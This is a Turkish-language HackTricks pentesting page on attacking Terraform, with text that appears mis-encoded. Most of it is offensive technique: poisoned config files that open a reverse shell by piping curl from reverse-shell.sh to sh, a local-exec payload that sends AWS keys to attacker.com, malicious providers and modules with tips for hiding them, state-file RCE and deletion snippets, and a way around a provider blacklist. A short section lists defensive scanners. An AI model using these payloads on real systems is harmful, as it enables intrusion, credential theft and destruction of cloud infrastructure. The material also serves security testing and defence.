# Terraform GÃ¼venliÄŸi

{{#include ../banners/hacktricks-training.md}}

## Temel Bilgiler

[Belgelerden:](https://developer.hashicorp.com/terraform/intro)

HashiCorp Terraform, **kod olarak altyapÄ± aracÄ±**dÄ±r ve hem **bulut hem de yerel kaynaklarÄ±** insan tarafÄ±ndan okunabilir yapÄ±landÄ±rma dosyalarÄ±nda tanÄ±mlamanÄ±za olanak tanÄ±r; bu dosyalarÄ± sÃ¼rÃ¼mleyebilir, yeniden kullanabilir ve paylaÅŸabilirsiniz. Daha sonra, altyapÄ±nÄ±zÄ±n yaÅŸam dÃ¶ngÃ¼sÃ¼ boyunca tÃ¼m altyapÄ±nÄ±zÄ± saÄŸlamak ve yÃ¶netmek iÃ§in tutarlÄ± bir iÅŸ akÄ±ÅŸÄ± kullanabilirsiniz. Terraform, hesaplama, depolama ve aÄŸ kaynaklarÄ± gibi dÃ¼ÅŸÃ¼k seviyeli bileÅŸenleri yÃ¶netebildiÄŸi gibi, DNS giriÅŸleri ve SaaS Ã¶zellikleri gibi yÃ¼ksek seviyeli bileÅŸenleri de yÃ¶netebilir.

#### Terraform nasÄ±l Ã§alÄ±ÅŸÄ±r?

Terraform, bulut platformlarÄ±nda ve diÄŸer hizmetlerde kaynaklarÄ± uygulama programlama arayÃ¼zleri (API'ler) aracÄ±lÄ±ÄŸÄ±yla oluÅŸturur ve yÃ¶netir. SaÄŸlayÄ±cÄ±lar, Terraform'un eriÅŸilebilir bir API'ye sahip olan hemen hemen her platform veya hizmetle Ã§alÄ±ÅŸmasÄ±nÄ± saÄŸlar.

![](<../images/image (177).png>)

HashiCorp ve Terraform topluluÄŸu, farklÄ± tÃ¼rdeki binlerce kaynak ve hizmeti yÃ¶netmek iÃ§in **1700'den fazla saÄŸlayÄ±cÄ±** yazmÄ±ÅŸtÄ±r ve bu sayÄ± artmaya devam etmektedir. TÃ¼m kamuya aÃ§Ä±k saÄŸlayÄ±cÄ±larÄ± [Terraform KayÄ±t Defteri](https://registry.terraform.io/) Ã¼zerinde bulabilirsiniz; bunlar arasÄ±nda Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog ve daha birÃ§oklarÄ± bulunmaktadÄ±r.

Temel Terraform iÅŸ akÄ±ÅŸÄ± Ã¼Ã§ aÅŸamadan oluÅŸur:

- **Yaz:** Birden fazla bulut saÄŸlayÄ±cÄ±sÄ± ve hizmeti arasÄ±nda olabilecek kaynaklarÄ± tanÄ±mlarsÄ±nÄ±z. Ã–rneÄŸin, gÃ¼venlik gruplarÄ± ve bir yÃ¼k dengeleyici ile sanal Ã¶zel bulut (VPC) aÄŸÄ±nda bir uygulama daÄŸÄ±tmak iÃ§in bir yapÄ±landÄ±rma oluÅŸturabilirsiniz.
- **Planla:** Terraform, mevcut altyapÄ± ve yapÄ±landÄ±rmanÄ±za dayanarak oluÅŸturacaÄŸÄ±, gÃ¼ncelleyeceÄŸi veya yok edeceÄŸi altyapÄ±yÄ± tanÄ±mlayan bir yÃ¼rÃ¼tme planÄ± oluÅŸturur.
- **Uygula:** OnaylandÄ±ÄŸÄ±nda, Terraform, kaynak baÄŸÄ±mlÄ±lÄ±klarÄ±na saygÄ± gÃ¶stererek Ã¶nerilen iÅŸlemleri doÄŸru sÄ±rayla gerÃ§ekleÅŸtirir. Ã–rneÄŸin, bir VPC'nin Ã¶zelliklerini gÃ¼nceller ve o VPC'deki sanal makine sayÄ±sÄ±nÄ± deÄŸiÅŸtirirseniz, Terraform, sanal makineleri Ã¶lÃ§eklendirmeden Ã¶nce VPC'yi yeniden oluÅŸturur.

![](<../images/image (215).png>)

### Terraform LaboratuvarÄ±

BilgisayarÄ±nÄ±za terraform'u kurun.

Burada bir [kÄ±lavuz](https://learn.hashicorp.com/tutorials/terraform/install-cli) ve burada terraform'u indirmenin [en iyi yolu](https://www.terraform.io/downloads) var.

## Terraform'da RCE: yapÄ±landÄ±rma dosyasÄ± zehirlenmesi

Terraform, **bir web sayfasÄ± veya bir aÄŸ hizmeti sunan bir platforma sahip deÄŸildir**; bu nedenle, terraform'u tehlikeye atmanÄ±n tek yolu, **terraform yapÄ±landÄ±rma dosyalarÄ±nÄ± eklemek/deÄŸiÅŸtirmek** veya **terraform durum dosyasÄ±nÄ± deÄŸiÅŸtirmek** (aÅŸaÄŸÄ±daki bÃ¶lÃ¼me bakÄ±n) olacaktÄ±r.

Ancak, terraform, **farklÄ± konumlara ayrÄ±calÄ±klÄ± eriÅŸim** saÄŸlayacaÄŸÄ± iÃ§in tehlikeye atÄ±lmasÄ± **Ã§ok hassas bir bileÅŸendir**.

Bir saldÄ±rganÄ±n terraform'un Ã§alÄ±ÅŸtÄ±ÄŸÄ± sistemi tehlikeye atabilmesinin ana yolu, **terraform yapÄ±landÄ±rmalarÄ±nÄ± depolayan depoyu tehlikeye atmaktÄ±r**, Ã§Ã¼nkÃ¼ bir noktada bunlar **yorumlanacaktÄ±r**.

AslÄ±nda, bir PR oluÅŸturulduktan sonra **terraform plan/uygula** iÅŸlemlerini otomatik olarak gerÃ§ekleÅŸtiren Ã§Ã¶zÃ¼mler mevcuttur, Ã¶rneÄŸin **Atlantis**:

{{#ref}}
atlantis-security.md
{{#endref}}

EÄŸer bir terraform dosyasÄ±nÄ± tehlikeye atmayÄ± baÅŸarÄ±rsanÄ±z, birisi `terraform plan` veya `terraform apply` komutunu Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±nda RCE gerÃ§ekleÅŸtirmek iÃ§in farklÄ± yollar vardÄ±r.

### Terraform planÄ±

Terraform planÄ±, terraform'da **en Ã§ok kullanÄ±lan komut**dur ve terraform kullanan geliÅŸtiriciler/Ã§Ã¶zÃ¼mler bunu sÃ¼rekli olarak Ã§aÄŸÄ±rÄ±r, bu nedenle **RCE elde etmenin en kolay yolu**, bir `terraform plan` iÃ§inde rastgele komutlar Ã§alÄ±ÅŸtÄ±racak bir terraform yapÄ±landÄ±rma dosyasÄ±nÄ± zehirlemektir.

**DÄ±ÅŸ saÄŸlayÄ±cÄ± kullanarak**

Terraform, Terraform ile dÄ±ÅŸ programlar arasÄ±nda arayÃ¼z saÄŸlamak iÃ§in [`external` saÄŸlayÄ±cÄ±sÄ±nÄ±](https://registry.terraform.io/providers/hashicorp/external/latest/docs) sunar. `plan` sÄ±rasÄ±nda rastgele kod Ã§alÄ±ÅŸtÄ±rmak iÃ§in `external` veri kaynaÄŸÄ±nÄ± kullanabilirsiniz.

Bir terraform yapÄ±landÄ±rma dosyasÄ±na aÅŸaÄŸÄ±dakine benzer bir ÅŸey enjekte etmek, `terraform plan` Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda bir rev shell Ã§alÄ±ÅŸtÄ±racaktÄ±r:
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
**Ã–zel bir saÄŸlayÄ±cÄ± kullanma**

Bir saldÄ±rgan, [Terraform Registry](https://registry.terraform.io/) 'ne [Ã¶zel bir saÄŸlayÄ±cÄ±](https://learn.hashicorp.com/tutorials/terraform/provider-setup) gÃ¶nderebilir ve ardÄ±ndan bunu bir Ã¶zellik dalÄ±ndaki Terraform koduna ekleyebilir ([buradan Ã¶rnek](https://alex.kaskaso.li/post/terraform-plan-rce)):
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
SaÄŸlayÄ±cÄ± `init` sÄ±rasÄ±nda indirilir ve `plan` Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda kÃ¶tÃ¼ niyetli kodu Ã§alÄ±ÅŸtÄ±rÄ±r.

Bir Ã¶rneÄŸi [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec) adresinde bulabilirsiniz.

**DÄ±ÅŸ bir referans kullanma**

Bahsedilen her iki seÃ§enek de faydalÄ±dÄ±r ancak Ã§ok gizli deÄŸildir (ikincisi daha gizli ama birincisinden daha karmaÅŸÄ±ktÄ±r). Bu saldÄ±rÄ±yÄ± **daha gizli bir ÅŸekilde** gerÃ§ekleÅŸtirebilirsiniz, bu Ã¶nerileri takip ederek:

- Rev shell'i doÄŸrudan terraform dosyasÄ±na eklemek yerine, rev shell'i iÃ§eren **dÄ±ÅŸ bir kaynaÄŸÄ±** **yÃ¼kleyebilirsiniz**:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Rev shell kodunu [https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules](https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules) adresinde bulabilirsiniz.

- DÄ±ÅŸ kaynakta, **ref** Ã¶zelliÄŸini kullanarak repo iÃ§inde **bir dalda terraform rev shell kodunu gizleyin**, ÅŸÃ¶yle bir ÅŸey: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Terraform Apply

Terraform apply, tÃ¼m deÄŸiÅŸiklikleri uygulamak iÃ§in Ã§alÄ±ÅŸtÄ±rÄ±lacaktÄ±r, ayrÄ±ca **kÃ¶tÃ¼ niyetli bir Terraform dosyasÄ±nÄ±** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)** ile RCE elde etmek iÃ§in de kÃ¶tÃ¼ye kullanabilirsiniz.**\
Sadece, aÅŸaÄŸÄ±daki gibi bir yÃ¼kÃ¼n `main.tf` dosyasÄ±nda sona erdiÄŸinden emin olmalÄ±sÄ±nÄ±z:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Ã–nceki teknikteki **Ã¶nerileri takip ederek** bu saldÄ±rÄ±yÄ± **daha gizli bir ÅŸekilde dÄ±ÅŸ referanslar kullanarak** gerÃ§ekleÅŸtirin.

## Gizli Bilgiler DÃ¶kÃ¼mÃ¼

`terraform apply` komutunu Ã§alÄ±ÅŸtÄ±rarak **terraform tarafÄ±ndan kullanÄ±lan gizli deÄŸerlerin dÃ¶kÃ¼lmesini** saÄŸlamak iÃ§in terraform dosyasÄ±na ÅŸu ÅŸekilde bir ÅŸey ekleyebilirsiniz:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## Terraform Durum DosyalarÄ±nÄ± KÃ¶tÃ¼ye Kullanma

Terraform durum dosyalarÄ± Ã¼zerinde yazma eriÅŸiminiz varsa ancak terraform kodunu deÄŸiÅŸtiremiyorsanÄ±z, [**bu araÅŸtÄ±rma**](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/) dosyadan yararlanmak iÃ§in bazÄ± ilginÃ§ seÃ§enekler sunmaktadÄ±r. KonfigÃ¼rasyon dosyalarÄ± Ã¼zerinde yazma eriÅŸiminiz olsa bile, durum dosyalarÄ±nÄ±n vektÃ¶rÃ¼nÃ¼ kullanmak genellikle daha sinsi bir yÃ¶ntemdir, Ã§Ã¼nkÃ¼ `git` geÃ§miÅŸinde iz bÄ±rakmazsÄ±nÄ±z.

### Terraform'da RCE: konfigÃ¼rasyon dosyasÄ± zehirleme

KÃ¶tÃ¼ niyetli bir saÄŸlayÄ±cÄ± ile terraform durum dosyasÄ±ndaki saÄŸlayÄ±cÄ±lardan birini deÄŸiÅŸtirmek veya kÃ¶tÃ¼ niyetli saÄŸlayÄ±cÄ±yÄ± referans alan sahte bir kaynak eklemek iÃ§in [Ã¶zel bir saÄŸlayÄ±cÄ± oluÅŸturmak](https://developer.hashicorp.com/terraform/tutorials/providers-plugin-framework/providers-plugin-framework-provider) mÃ¼mkÃ¼ndÃ¼r.

SaÄŸlayÄ±cÄ± [statefile-rce](https://registry.terraform.io/providers/offensive-actions/statefile-rce/latest) bu araÅŸtÄ±rmaya dayanmakta ve bu prensibi silahlandÄ±rmaktadÄ±r. Sahte bir kaynak ekleyebilir ve Ã§alÄ±ÅŸtÄ±rmak istediÄŸiniz keyfi bash komutunu `command` niteliÄŸinde belirtebilirsiniz. `terraform` Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda, bu hem `terraform plan` hem de `terraform apply` adÄ±mlarÄ±nda okunacak ve yÃ¼rÃ¼tÃ¼lecektir. `terraform apply` adÄ±mÄ±nda, `terraform` komutunuzu Ã§alÄ±ÅŸtÄ±rdÄ±ktan sonra sahte kaynaÄŸÄ± durum dosyasÄ±ndan silecek ve kendini temizleyecektir. Daha fazla bilgi ve tam bir demo, bu saÄŸlayÄ±cÄ±nÄ±n kaynak kodunu barÄ±ndÄ±ran [GitHub deposunda](https://github.com/offensive-actions/terraform-provider-statefile-rce) bulunabilir.

DoÄŸrudan kullanmak iÃ§in, `resources` dizisinin herhangi bir konumuna aÅŸaÄŸÄ±dakileri ekleyin ve `name` ile `command` niteliklerini Ã¶zelleÅŸtirin:
```json
{
"mode": "managed",
"type": "rce",
"name": "<arbitrary_name>",
"provider": "provider[\"registry.terraform.io/offensive-actions/statefile-rce\"]",
"instances": [
{
"schema_version": 0,
"attributes": {
"command": "<arbitrary_command>",
"id": "rce"
},
"sensitive_attributes": [],
"private": "bnVsbA=="
}
]
}
```
Sonra, `terraform` Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda, kodunuz Ã§alÄ±ÅŸacaktÄ±r.

### KaynaklarÄ± Silme <a href="#deleting-resources" id="deleting-resources"></a>

KaynaklarÄ± yok etmenin 2 yolu vardÄ±r:

1. **GerÃ§ek yok edilecek kaynaÄŸa iÅŸaret eden rastgele bir isimle durumu dosyasÄ±na bir kaynak ekleyin**

Ã‡Ã¼nkÃ¼ terraform, kaynaÄŸÄ±n mevcut olmamasÄ± gerektiÄŸini gÃ¶recektir, bu yÃ¼zden onu yok edecektir (belirtilen gerÃ§ek kaynak kimliÄŸini takip ederek). Ã–nceki sayfadan Ã¶rnek:
```json
{
"mode": "managed",
"type": "aws_instance",
"name": "example",
"provider": "provider[\"registry.terraform.io/hashicorp/aws\"]",
"instances": [
{
"attributes": {
"id": "i-1234567890abcdefg"
}
}
]
},
```
2. **KaynaÄŸÄ±, gÃ¼ncellenemeyecek ÅŸekilde silmek iÃ§in deÄŸiÅŸtirin (bu nedenle silinip yeniden oluÅŸturulacak)**

Bir EC2 Ã¶rneÄŸi iÃ§in, Ã¶rneÄŸin tÃ¼rÃ¼nÃ¼ deÄŸiÅŸtirmek, terraform'un onu silip yeniden oluÅŸturmasÄ± iÃ§in yeterlidir.

### Kara listeye alÄ±nmÄ±ÅŸ saÄŸlayÄ±cÄ±yÄ± deÄŸiÅŸtirin

`hashicorp/external` kara listeye alÄ±ndÄ±ÄŸÄ±nda, `external` saÄŸlayÄ±cÄ±sÄ±nÄ± yeniden uygulamak iÃ§in aÅŸaÄŸÄ±dakileri yapabilirsiniz. Not: https://registry.terraform.io/providers/nazarewk/external/latest adresinde yayÄ±nlanan bir external saÄŸlayÄ±cÄ± Ã§atalÄ±nÄ± kullanÄ±yoruz. Kendi Ã§atalÄ±nÄ±zÄ± veya yeniden uygulamanÄ±zÄ± da yayÄ±nlayabilirsiniz.
```terraform
terraform {
required_providers {
external = {
source  = "nazarewk/external"
version = "3.0.0"
}
}
}
```
Sonra `external`'Ä± normal ÅŸekilde kullanabilirsiniz.
```terraform
data "external" "example" {
program = ["sh", "-c", "whoami"]
}
```
## Otomatik Denetim AraÃ§larÄ±

### [**Snyk AltyapÄ± Kod Olarak (IaC)**](https://snyk.io/product/infrastructure-as-code-security/)

Snyk, Terraform, CloudFormation, Kubernetes ve diÄŸer IaC formatlarÄ±ndaki gÃ¼venlik aÃ§Ä±klarÄ±nÄ± ve yanlÄ±ÅŸ yapÄ±landÄ±rmalarÄ± tespit eden kapsamlÄ± bir AltyapÄ± Kod Olarak (IaC) tarama Ã§Ã¶zÃ¼mÃ¼ sunar.

- **Ã–zellikler:**
- GÃ¼venlik aÃ§Ä±klarÄ± ve uyumluluk sorunlarÄ± iÃ§in gerÃ§ek zamanlÄ± tarama.
- Versiyon kontrol sistemleriyle (GitHub, GitLab, Bitbucket) entegrasyon.
- Otomatik dÃ¼zeltme Ã§ekme istekleri.
- AyrÄ±ntÄ±lÄ± dÃ¼zeltme tavsiyeleri.
- **Kaydolun:** [Snyk](https://snyk.io/) Ã¼zerinde bir hesap oluÅŸturun.
```bash
brew tap snyk/tap
brew install snyk
snyk auth
snyk iac test /path/to/terraform/code
```
### [Checkov](https://github.com/bridgecrewio/checkov) <a href="#install-checkov-from-pypi" id="install-checkov-from-pypi"></a>

**Checkov**, altyapÄ± kodu (IaC) iÃ§in bir statik kod analiz aracÄ±dÄ±r ve ayrÄ±ca gÃ¶rÃ¼ntÃ¼ler ve aÃ§Ä±k kaynak paketleri iÃ§in bir yazÄ±lÄ±m bileÅŸimi analizi (SCA) aracÄ±dÄ±r.

[Terraform](https://terraform.io/) kullanÄ±larak saÄŸlanan bulut altyapÄ±sÄ±nÄ±, [Terraform plan](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Terraform%20Plan%20Scanning.md), [Cloudformation](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Cloudformation.md), [AWS SAM](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/AWS%20SAM.md), [Kubernetes](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Kubernetes.md), [Helm charts](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Helm.md), [Kustomize](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Kustomize.md), [Dockerfile](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Dockerfile.md), [Serverless](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Serverless%20Framework.md), [Bicep](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Bicep.md), [OpenAPI](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/OpenAPI.md), [ARM Templates](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Azure%20ARM%20templates.md) veya [OpenTofu](https://opentofu.org/) ile tarar ve grafik tabanlÄ± tarama kullanarak gÃ¼venlik ve uyumluluk yanlÄ±ÅŸ yapÄ±landÄ±rmalarÄ±nÄ± tespit eder.

AÃ§Ä±k kaynak paketleri ve gÃ¶rÃ¼ntÃ¼leri iÃ§in Ortak GÃ¼venlik AÃ§Ä±klarÄ± ve Maruziyetler (CVE'ler) taramasÄ± olan [YazÄ±lÄ±m BileÅŸimi Analizi (SCA) taramasÄ±](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Sca.md) gerÃ§ekleÅŸtirir.
```bash
pip install checkov
checkov -d /path/to/folder
```
### [terraform-compliance](https://github.com/terraform-compliance/cli)

From the [**docs**](https://github.com/terraform-compliance/cli): `terraform-compliance`, altyapÄ± kodunuz iÃ§in negatif test yeteneÄŸini etkinleÅŸtirmek amacÄ±yla terraform'a karÅŸÄ± hafif, gÃ¼venlik ve uyumluluk odaklÄ± bir test Ã§erÃ§evesidir.

- **uyumluluk:** Uygulanan kodun gÃ¼venlik standartlarÄ±na ve kendi Ã¶zel standartlarÄ±nÄ±za uygun olduÄŸundan emin olun.
- **davranÄ±ÅŸ odaklÄ± geliÅŸtirme:** Neredeyse her ÅŸey iÃ§in BDD'miz var, neden IaC iÃ§in olmasÄ±n?
- **taÅŸÄ±nabilir:** Sadece `pip` ile yÃ¼kleyin veya `docker` Ã¼zerinden Ã§alÄ±ÅŸtÄ±rÄ±n. [Kurulum](https://terraform-compliance.com/pages/installation/) sayfasÄ±na bakÄ±n.
- **Ã¶n daÄŸÄ±tÄ±m:** Kodunuzu daÄŸÄ±tÄ±lmadan Ã¶nce doÄŸrular.
- **entegrasyonu kolay:** TÃ¼m daÄŸÄ±tÄ±mlarÄ±n doÄŸrulandÄ±ÄŸÄ±ndan emin olmak iÃ§in pipeline'Ä±nÄ±zda (veya git hook'larÄ±nda) Ã§alÄ±ÅŸtÄ±rÄ±labilir.
- **gÃ¶rev ayrÄ±mÄ±:** Testlerinizi ayrÄ± bir ekibin sorumlu olduÄŸu farklÄ± bir depoda tutabilirsiniz.

> [!NOTE]
> Ne yazÄ±k ki, kod bazÄ± saÄŸlayÄ±cÄ±larÄ± kullanÄ±yorsa ve bu saÄŸlayÄ±cÄ±lara eriÅŸiminiz yoksa `terraform plan` gerÃ§ekleÅŸtiremeyecek ve bu aracÄ± Ã§alÄ±ÅŸtÄ±ramayacaksÄ±nÄ±z.
```bash
pip install terraform-compliance
terraform plan -out=plan.out
terraform-compliance -f /path/to/folder
```
### [tfsec](https://github.com/aquasecurity/tfsec)

From the [**docs**](https://github.com/aquasecurity/tfsec): tfsec, terraform kodunuzun statik analizini kullanarak potansiyel yanlÄ±ÅŸ yapÄ±landÄ±rmalarÄ± tespit eder.

- â˜ï¸ TÃ¼m bÃ¼yÃ¼k (ve bazÄ± kÃ¼Ã§Ã¼k) bulut saÄŸlayÄ±cÄ±larÄ± arasÄ±nda yanlÄ±ÅŸ yapÄ±landÄ±rmalarÄ± kontrol eder
- â›” YÃ¼zlerce yerleÅŸik kural
- ğŸª† ModÃ¼lleri (yerel ve uzaktan) tarar
- â• HCL ifadelerini ve literal deÄŸerleri deÄŸerlendirir
- â†ªï¸ Terraform fonksiyonlarÄ±nÄ± deÄŸerlendirir, Ã¶rneÄŸin `concat()`
- ğŸ”— Terraform kaynaklarÄ± arasÄ±ndaki iliÅŸkileri deÄŸerlendirir
- ğŸ§° Terraform CDK ile uyumlu
- ğŸ™… KullanÄ±cÄ± tanÄ±mlÄ± Rego politikalarÄ±nÄ± uygular (ve sÃ¼sler)
- ğŸ“ƒ Birden fazla Ã§Ä±ktÄ± formatÄ±nÄ± destekler: lovely (varsayÄ±lan), JSON, SARIF, CSV, CheckStyle, JUnit, metin, Gif.
- ğŸ› ï¸ YapÄ±landÄ±rÄ±labilir (CLI bayraklarÄ± ve/veya yapÄ±landÄ±rma dosyasÄ± aracÄ±lÄ±ÄŸÄ±yla)
- âš¡ Ã‡ok hÄ±zlÄ±, bÃ¼yÃ¼k depolarÄ± hÄ±zlÄ± bir ÅŸekilde tarama yeteneÄŸine sahip
```bash
brew install tfsec
tfsec /path/to/folder
```
### [KICKS](https://github.com/Checkmarx/kics)

GeliÅŸtirme dÃ¶ngÃ¼sÃ¼nÃ¼n baÅŸÄ±nda, **KICS** ile altyapÄ±nÄ±zÄ± kod olarak gÃ¼venlik aÃ§Ä±klarÄ±, uyumluluk sorunlarÄ± ve altyapÄ± yanlÄ±ÅŸ yapÄ±landÄ±rmalarÄ±nÄ± erken tespit edin.

**KICS**, **K**eeping **I**nfrastructure as **C**ode **S**ecure'Ä±n kÄ±saltmasÄ±dÄ±r, aÃ§Ä±k kaynaklÄ±dÄ±r ve herhangi bir bulut yerel projesi iÃ§in vazgeÃ§ilmezdir.
```bash
docker run -t -v $(pwd):/path checkmarx/kics:latest scan -p /path -o "/path/"
```
### [Terrascan](https://github.com/tenable/terrascan)

From the [**docs**](https://github.com/tenable/terrascan): Terrascan, Kod Olarak AltyapÄ± iÃ§in statik bir kod analizÃ¶rÃ¼dÃ¼r. Terrascan, ÅŸunlarÄ± yapmanÄ±za olanak tanÄ±r:

- AltyapÄ±yÄ± kod olarak hatalÄ± yapÄ±landÄ±rmalar iÃ§in sorunsuz bir ÅŸekilde tarayÄ±n.
- SaÄŸlanan bulut altyapÄ±sÄ±nÄ±, duruÅŸ kaymasÄ± oluÅŸturan yapÄ±landÄ±rma deÄŸiÅŸiklikleri iÃ§in izleyin ve gÃ¼venli bir duruÅŸa geri dÃ¶nmeyi saÄŸlayÄ±n.
- GÃ¼venlik aÃ§Ä±klarÄ±nÄ± ve uyumluluk ihlallerini tespit edin.
- Bulut yerel altyapÄ±yÄ± saÄŸlamadan Ã¶nce riskleri azaltÄ±n.
- Yerel olarak Ã§alÄ±ÅŸtÄ±rma veya CI\CD'nizle entegre etme esnekliÄŸi sunar.
```bash
brew install terrascan
```
## Referanslar

- [Atlantis Security](atlantis-security.md)
- [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)
- [https://developer.hashicorp.com/terraform/intro](https://developer.hashicorp.com/terraform/intro)
- [https://blog.plerion.com/hacking-terraform-state-privilege-escalation/](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/)
- [https://github.com/offensive-actions/terraform-provider-statefile-rce](https://github.com/offensive-actions/terraform-provider-statefile-rce)

{{#include ../banners/hacktricks-training.md}}
